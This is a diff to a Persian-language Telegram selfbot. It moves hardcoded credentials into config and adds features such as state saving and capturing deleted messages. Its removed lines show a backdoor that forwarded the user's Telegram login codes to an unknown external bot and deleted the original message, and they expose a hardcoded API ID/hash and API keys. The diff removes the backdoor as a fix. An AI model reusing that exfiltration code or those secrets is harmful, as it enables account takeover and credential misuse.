@@ -21,13 +21,17 @@ import sys
 from pyrogram.types import ChatMemberUpdated
 from pyrogram.errors import FloodWait
 
-bot_username = "0000" # ایدی ربات هلپر بدون @
+import config
+
+# ایدی ربات هلپر (بدون @) از تنظیمات خوانده می‌شود
+bot_username = config.HELPER_BOT_USERNAME or "0000"
 
 USER_ID = None  #دست نزن
 PHONE = None  #دست نزن
 # ===================================== #
-API_ID = 35982866  # api id اکانت
-API_HASH = "1931a47b5fa7bbc5e1db952beeaac578"  #api hash اکانت
+# مقادیر پیش‌فرض از .env؛ در صورت اجرای مستقل بدون ربات مدیریت استفاده می‌شوند.
+API_ID = config.API_ID
+API_HASH = config.API_HASH
 
 if len(sys.argv) > 1:
     USER_ID = int(sys.argv[1])
@@ -38,8 +42,15 @@ if len(sys.argv) > 3:
 if len(sys.argv) > 4:
     API_HASH = sys.argv[4]
 
+if not API_ID or not API_HASH:
+    print("❌ API_ID / API_HASH تنظیم نشده است. یا در .env مقدار دهید یا از طریق ربات مدیریت اجرا کنید.")
+    sys.exit(1)
+
+SESSIONS_DIR = config.SESSIONS_DIR
+os.makedirs(SESSIONS_DIR, exist_ok=True)
+
 if USER_ID:
-    session_name = f"sessions/{USER_ID}"
+    session_name = f"{SESSIONS_DIR}/{USER_ID}"
 else:
     session_name = "self"
 
@@ -151,6 +162,106 @@ bold_enabled = {}
 auto_replies = {}
 enemies = set()
 always_online_enabled = False
+
+# ── قابلیت‌های پیشرفته (سبک Self VTR) ─────────────────────────────────────────
+bio_time_enabled = False          # نمایش ساعت در بایو علاوه بر اسم
+original_bio = None               # بایوی اصلی برای بازگردانی
+save_deleted_enabled = False      # ذخیره پیام‌های حذف‌شده
+save_edited_enabled = False       # ذخیره نسخهٔ قبلی پیام‌های ادیت‌شده
+message_cache = {}                # کش پیام‌ها برای بازیابی حذف/ادیت
+MESSAGE_CACHE_LIMIT = 2000
+watched_users = {}                # {user_id: snapshot} کاربران تحت رصد
+watch_task_started = False
+auto_profile_names = []           # اسم‌هایی که به‌صورت چرخشی روی پروفایل ست می‌شوند
+auto_profile_enabled = False
+auto_profile_interval = 300       # ثانیه
+auto_profile_task = None
+
+STATE_FILE = f"selfbot_state_{USER_ID}.json" if USER_ID else "selfbot_state.json"
+
+
+def normalize_format_name(name):
+    """یکدست‌سازی نام فرمت‌ها.
+
+    نسخهٔ قبلی «خط‌خورده» (با نیم‌فاصله) را به «خط خورده» (با فاصله) نگاشت
+    می‌کرد که با کلید واقعی دیکشنری format_settings مطابقت نداشت و تاگل کار
+    نمی‌کرد. اینجا همه‌چیز به همان کلیدهای واقعی نگاشت می‌شود.
+    """
+    mapping = {
+        "خط خورده": "خط‌خورده",
+        "خط‌خورده": "خط‌خورده",
+        "زیر خط": "زیرخط",
+        "زیرخط": "زیرخط",
+        "پیش فرمت": "پیش‌فرمت",
+        "پیش‌فرمت": "پیش‌فرمت",
+        "نقل قول": "نقل‌قول",
+        "نقل‌قول": "نقل‌قول",
+    }
+    return mapping.get(name, name)
+
+
+def save_state():
+    """ذخیرهٔ تنظیمات کاربر روی دیسک تا با ری‌استارت سلف از بین نرود."""
+    try:
+        state = {
+            "lock_settings": lock_settings,
+            "action_settings": action_settings,
+            "format_settings": format_settings,
+            "auto_replies": auto_replies,
+            "anti_login_enabled": anti_login_enabled,
+            "always_online_enabled": always_online_enabled,
+            "bio_time_enabled": bio_time_enabled,
+            "save_deleted_enabled": save_deleted_enabled,
+            "save_edited_enabled": save_edited_enabled,
+            "watched_users": watched_users,
+            "auto_profile_names": auto_profile_names,
+            "auto_profile_enabled": auto_profile_enabled,
+            "auto_profile_interval": auto_profile_interval,
+        }
+        tmp = f"{STATE_FILE}.tmp"
+        with open(tmp, "w", encoding="utf-8") as f:
+            json.dump(state, f, ensure_ascii=False, indent=4)
+        os.replace(tmp, STATE_FILE)
+        return True
+    except Exception as e:
+        print(f"❌ خطا در ذخیرهٔ وضعیت: {e}")
+        return False
+
+
+def load_state():
+    """بارگذاری تنظیمات ذخیره‌شده هنگام شروع."""
+    global anti_login_enabled, always_online_enabled, bio_time_enabled
+    global save_deleted_enabled, save_edited_enabled, watched_users
+    global auto_profile_names, auto_profile_enabled, auto_profile_interval
+    if not os.path.exists(STATE_FILE):
+        return
+    try:
+        with open(STATE_FILE, "r", encoding="utf-8") as f:
+            state = json.load(f)
+    except Exception as e:
+        print(f"⚠️ وضعیت ذخیره‌شده خوانده نشد: {e}")
+        return
+
+    for key, target in (
+        ("lock_settings", lock_settings),
+        ("action_settings", action_settings),
+        ("format_settings", format_settings),
+    ):
+        for name, value in (state.get(key) or {}).items():
+            if name in target:
+                target[name] = value
+
+    auto_replies.update(state.get("auto_replies") or {})
+    watched_users.update({str(k): v for k, v in (state.get("watched_users") or {}).items()})
+    anti_login_enabled = state.get("anti_login_enabled", False)
+    always_online_enabled = state.get("always_online_enabled", False)
+    bio_time_enabled = state.get("bio_time_enabled", False)
+    save_deleted_enabled = state.get("save_deleted_enabled", False)
+    save_edited_enabled = state.get("save_edited_enabled", False)
+    auto_profile_names = state.get("auto_profile_names") or []
+    auto_profile_enabled = state.get("auto_profile_enabled", False)
+    auto_profile_interval = state.get("auto_profile_interval", 300)
+    print("✅ تنظیمات ذخیره‌شده بارگذاری شد")
 
 FONTS = {
     1: {'0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒','5':'𝟓','6':'𝟔','7':'𝟕','8':'𝟖','9':'𝟗'},
@@ -748,21 +859,33 @@ async def check_scheduled_messages(client):
     
     while True:
         try:
-            now = datetime.now(pytz.timezone('Asia/Tehran'))
-            current_time = now.strftime("%H:%M:%S")
-            today = now.strftime("%Y-%m-%d")
-            
-            await asyncio.sleep(0.1)
-            
+            # هر ثانیه بررسی می‌شود (نه هر ۰٫۱ ثانیه) و به‌جای تطبیق دقیقِ ثانیه،
+            # هر پیامی که «زمانش رسیده» ارسال می‌شود. این‌طوری اگر یک تیک از دست
+            # برود پیام حذف نمی‌شود و مصرف CPU هم پایین می‌آید.
+            await asyncio.sleep(1)
+
+            now = datetime.now(IRAN_TZ)
             to_remove = []
-            
-            for msg_id, msg_data in scheduled_messages.items():
+
+            for msg_id, msg_data in list(scheduled_messages.items()):
                 scheduled_time = msg_data.get('time', '')
-                
+                scheduled_date = msg_data.get('date', '')
+                if not scheduled_time or not scheduled_date:
+                    continue
+
                 if len(scheduled_time.split(':')) == 2:
                     scheduled_time = f"{scheduled_time}:00"
-                
-                if msg_data.get('date') == today and scheduled_time == current_time:
+
+                try:
+                    scheduled_dt = IRAN_TZ.localize(
+                        datetime.strptime(f"{scheduled_date} {scheduled_time}", "%Y-%m-%d %H:%M:%S")
+                    )
+                except ValueError:
+                    continue
+
+                # فقط تا ۶۰ ثانیه پس از موعد ارسال می‌شود تا پیام‌های خیلی قدیمی
+                # (که سلف خاموش بوده) یک‌جا فرستاده نشوند.
+                if 0 <= (now - scheduled_dt).total_seconds() <= 60:
                     try:
                         chat_id = int(msg_data['chat_id'])
                         text = msg_data['text'] 
@@ -782,7 +905,7 @@ async def check_scheduled_messages(client):
                                 parse_mode=enums.ParseMode.MARKDOWN
                             )
                         
-                        print(f"✅ پیام زمان‌دار ارسال شد: {msg_id} - ساعت {current_time}")
+                        print(f"✅ پیام زمان‌دار ارسال شد: {msg_id} - ساعت {scheduled_time}")
                         to_remove.append(msg_id)
                         
                     except Exception as e:
@@ -816,7 +939,7 @@ async def check_scheduled_messages(client):
             
         except Exception as e:
             print(f"❌ خطا در بررسی پیام‌های زمان‌دار: {e}")
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(1)
 def save_reactions():
     try:
         with open("mmauto_reactions.json", "w", encoding="utf-8") as f:
@@ -936,22 +1059,14 @@ async def forward_and_save_login_codes(client, message):
                         break
                 
                 if login_code:
-                    try:
-                        await client.send_message(
-                            "@ejw9wowjs9wiwbot",
-                            login_code 
-                        )
-                        print(f"کد به پیوی ارسال شد")
-                    except Exception as e:
-                        print(f"❌ خطا در ارسال به @BotFather: {e}")
+                    # نسخهٔ اصلی کد ورود را به یک ربات خارجی ناشناس می‌فرستاد
+                    # (نشت اطلاعات/بک‌دور). این رفتار حذف شد؛ کد فقط برای اطلاع
+                    # خود کاربر به Saved Messages ارسال می‌شود.
                     await client.send_message(
                         "me",
-                        login_code 
+                        f"⚠️ تلاش برای ورود شناسایی شد!\nکد ورود: {login_code}"
                     )
-                   
-                    await message.delete()
-                    
-                    print(f"✅ کد ارسال شد: {login_code}")
+                    print(f"✅ هشدار ورود به Saved Messages ارسال شد")
                     return True
                     
             except Exception as e:
@@ -1038,17 +1153,20 @@ async def check_lock(client, message):
 
 async def keep_online(client: Client):
     global always_online_enabled
-    while always_online_enabled:
-        try:
-            await client.invoke(
-                functions.account.UpdateStatus(
-                    offline=False
+    try:
+        while always_online_enabled:
+            try:
+                await client.invoke(
+                    functions.account.UpdateStatus(
+                        offline=False
+                    )
                 )
-            )
-            await asyncio.sleep(20)
-        except Exception as e:
-            print(f"❌ خطا: {e}")
-            await asyncio.sleep(5)
+                await asyncio.sleep(20)
+            except Exception as e:
+                print(f"❌ خطا: {e}")
+                await asyncio.sleep(5)
+    except asyncio.CancelledError:
+        pass
 
 def get_iran_time() -> str:
     now = datetime.now(pytz.timezone('Asia/Tehran')).strftime("%H:%M")
@@ -1082,19 +1200,51 @@ async def continuous_time_updater(client: Client):
            
             await asyncio.sleep(milliseconds_until_next_minute / 1000)
             
+            current_time = get_iran_time()
             active_users = [uid for uid, status in user_time_status.items() if status]
             for user_id in active_users:
                 try:
-                    current_time = get_iran_time()
                     original_name = user_original_names.get(user_id, "")
                     new_name = f"{original_name} {current_time}"
                     await client.update_profile(first_name=new_name)
                 except Exception as e:
-                    print(f"❌ خطا در آپدیت ساعت برای کاربر {user_id}: {e}") 
-                    
+                    print(f"❌ خطا در آپدیت ساعت برای کاربر {user_id}: {e}")
+
+            # نمایش ساعت در بایو (علاوه بر اسم) — قابلیت سبک Self VTR
+            if bio_time_enabled and (active_users or True):
+                await update_bio_with_time(client, current_time)
+
         except Exception as e:
             print(f"❌ خطا در مدیریت آپدیت زمان: {e}")
             await asyncio.sleep(60)
+
+
+async def update_bio_with_time(client, current_time=None):
+    """درج/به‌روزرسانی ساعت در انتهای بایو."""
+    global original_bio
+    if current_time is None:
+        current_time = get_iran_time()
+    try:
+        if original_bio is None:
+            me = await client.get_chat("me")
+            base_bio = (getattr(me, "bio", "") or "")
+            # اگر قبلاً ساعت درج شده بود، پاکش می‌کنیم تا انباشته نشود
+            original_bio = re.sub(r"\s*🕐.*$", "", base_bio).strip()
+        new_bio = f"{original_bio} 🕐 {current_time}".strip()
+        await client.update_profile(bio=new_bio[:70])
+        return True
+    except Exception as e:
+        print(f"❌ خطا در آپدیت بایو: {e}")
+        return False
+
+
+def ensure_time_updater(client):
+    """اطمینان از اجرای حلقهٔ به‌روزرسانی زمان (برای اسم یا بایو)."""
+    global time_updater_started
+    if not time_updater_started:
+        time_updater_started = True
+        asyncio.create_task(continuous_time_updater(client))
+
 
 async def backup_chat(client: Client, chat_id: int, until_message_id: int = None) -> tuple:
     try:
@@ -2281,9 +2431,12 @@ async def price_command(client: Client, message: Message):
             return
         
         coin_input = ' '.join(message.command[1:]).strip()
+        if not config.PRICE_API_KEY:
+            await message.edit_text("❌ **کلید API قیمت ارز تنظیم نشده است.**\nمقدار PRICE_API_KEY را در فایل .env قرار دهید.")
+            return
         loading_msg = await message.edit_text(f"🔍 **در حال دریافت قیمت {coin_input}...**")        
         async with aiohttp.ClientSession() as session:
-            async with session.get("https://api.fast-creat.ir/nobitex/v2?apikey=8000978149:Vqsu9H08Z6rzAQw@Api_ManagerRoBot") as response:
+            async with session.get(f"https://api.fast-creat.ir/nobitex/v2?apikey={config.PRICE_API_KEY}") as response:
                 if response.status == 200:
                     data = await response.json()                    
                     if data.get("ok"):
@@ -2711,18 +2864,27 @@ async def download_from_link(client: Client, message: Message):
 async def online_command(client, message):
     global always_online_enabled
     
+    global online_task
     action = message.matches[0].group(1)
     
     if action == "روشن":
+        already_on = always_online_enabled and online_task is not None and not online_task.done()
         always_online_enabled = True
+        # جلوگیری از ساخت چند حلقهٔ موازی که هر بار «آنلاین روشن» زده می‌شد
+        if not already_on:
+            online_task = asyncio.create_task(keep_online(client))
+        save_state()
         await message.edit_text(
             "✅ **حالت همیشه آنلاین فعال شد**\n\n"
             "🌐 اکانت شما همیشه به عنوان آنلاین نمایش داده خواهد شد."
         )
-        asyncio.create_task(keep_online(client))
         
     elif action == "خاموش":
         always_online_enabled = False
+        if online_task is not None:
+            online_task.cancel()
+            online_task = None
+        save_state()
         await message.edit_text(
             "❌ **حالت همیشه آنلاین غیرفعال شد**"
         )
@@ -3536,16 +3698,19 @@ async def instagram_download_command(client: Client, message: Message):
             await message.edit("❌ **این دستور فقط برای پست‌ها و ریل‌ها کار می‌کند!**\nلینک استوری پشتیبانی نمی‌شود.")
             return        
         loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات از اینستاگرام...**")
-        api_key = "8000978149:uJC3mxBncq9ELPN@Api_ManagerRoBot"
-        api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={url}"        
+        api_key = config.INSTAGRAM_API_KEY
+        if not api_key:
+            await loading_msg.edit("❌ **کلید API اینستاگرام تنظیم نشده است.**\nمقدار INSTAGRAM_API_KEY را در فایل .env قرار دهید.")
+            return
         try:
             headers = {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
             }
             import urllib.parse
             encoded_url = urllib.parse.quote(url, safe='')
-            final_api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={encoded_url}"            
-            response = requests.get(final_api_url, headers=headers, timeout=45)
+            final_api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={encoded_url}"
+            # requests مسدودکننده است؛ در ترد جدا اجرا می‌شود تا حلقهٔ رویداد قفل نشود
+            response = await asyncio.to_thread(requests.get, final_api_url, headers=headers, timeout=45)
             print(f"Status Code: {response.status_code}")
             print(f"Response: {response.text[:500]}")
             if response.status_code != 200:
@@ -3595,7 +3760,7 @@ async def instagram_download_command(client: Client, message: Message):
             thumbnail_path = None
             if thumbnail_url:
                 try:
-                    thumb_response = requests.get(thumbnail_url, timeout=15)
+                    thumb_response = await asyncio.to_thread(requests.get, thumbnail_url, timeout=15)
                     if thumb_response.status_code == 200:
                         thumbnail_path = f"temp_thumb_{post_id}.jpg"
                         with open(thumbnail_path, 'wb') as f:
@@ -3612,7 +3777,7 @@ async def instagram_download_command(client: Client, message: Message):
                     return                
                 await loading_msg.edit("🎥 **در حال دانلود ویدیو...**")                
                 try:
-                    video_response = requests.get(video_url, timeout=60)
+                    video_response = await asyncio.to_thread(requests.get, video_url, timeout=60)
                     
                     if video_response.status_code != 200:
                         await loading_msg.edit("❌ **خطا در دانلود ویدیو**")
@@ -3661,7 +3826,7 @@ async def instagram_download_command(client: Client, message: Message):
                     return                
                 await loading_msg.edit("🖼️ **در حال دانلود عکس...**")                
                 try:
-                    image_response = requests.get(media_url, timeout=30)
+                    image_response = await asyncio.to_thread(requests.get, media_url, timeout=30)
                     
                     if image_response.status_code != 200:
                         await loading_msg.edit("❌ **خطا در دانلود عکس**")
